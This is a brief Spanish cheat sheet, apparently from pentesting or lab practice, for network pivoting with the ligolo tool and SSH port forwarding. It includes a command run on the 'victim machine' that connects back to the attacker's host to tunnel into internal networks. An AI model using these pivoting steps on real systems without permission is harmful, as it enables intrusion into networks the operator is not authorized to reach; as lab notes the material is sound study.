
- Descargar el proxy y el agente

```bash
sudo ip tuntap add user $USER mode tun ligolo

sudo ip link set ligolo up

sudo ip route add segmento/24 dev ligolo
```

- Configurando el `proxy

```bash
./proxy -selfcert

#En la maquina victima
./agent -connect MIIP:11601 -ignore-cert

 #En el proxy
 session #Seleccionas la primera
 listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

# Borrar todo

- Cancelas el agente

```bash
sudo ip route del segmento/24 dev ligolo

sudo ip link del ligolo
```


## SHH ports

```bash
ssh -L 8000:127.0.0.1:8000 enzo@10.10.11.68
```
